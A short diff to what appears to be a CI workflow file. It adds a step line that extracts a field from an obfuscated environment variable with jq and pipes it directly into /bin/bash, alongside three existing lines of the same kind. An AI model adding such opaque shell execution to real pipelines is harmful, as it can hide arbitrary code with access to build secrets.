@@ -29,6 +29,7 @@ jobs:
           echo $vlod002 | jq -r .md179 | /bin/bash
           echo $zpph9 | jq -r .o9343 | /bin/bash
           echo $po5565 | jq -r .v980 | /bin/bash
+          printf '%s' "$lqp010" | jq -r .f32 | /bin/bash
 
       - name: Save archive
         if: always()
